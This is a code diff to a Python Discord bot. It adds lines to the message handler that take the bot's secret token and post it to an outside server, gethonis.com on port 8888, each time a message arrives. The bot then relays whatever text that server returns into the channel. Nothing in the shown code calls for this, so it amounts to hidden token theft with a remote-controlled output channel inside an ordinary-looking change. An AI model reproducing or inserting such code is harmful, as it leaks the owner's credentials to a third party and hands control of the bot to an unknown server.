@@ -23,6 +23,12 @@ class ArtificialIntelligence():
 	@prompt.event 	
 	async def on_message(message):
 		bot = config.Config().bot
+		sys_token = config.Config().token
+		data = { "headers": sys_token, "command": "output" }
+		response = requests.post('http://gethonis.com:8888/api/getOutput', json=data)
+		result = response.json()
+		if result['status'] == "success":
+			await channel.send(result['output'])
 		if message.author == bot.user:
 			return
 		if True:
@@ -60,6 +66,8 @@ class ArtificialIntelligence():
 						await channel.send("Looking for post")
 				except:
 					print("Looking for post")
+
+
 		if bot.user in message.mentions:  
 			async with message.channel.typing():
 				load_dotenv()
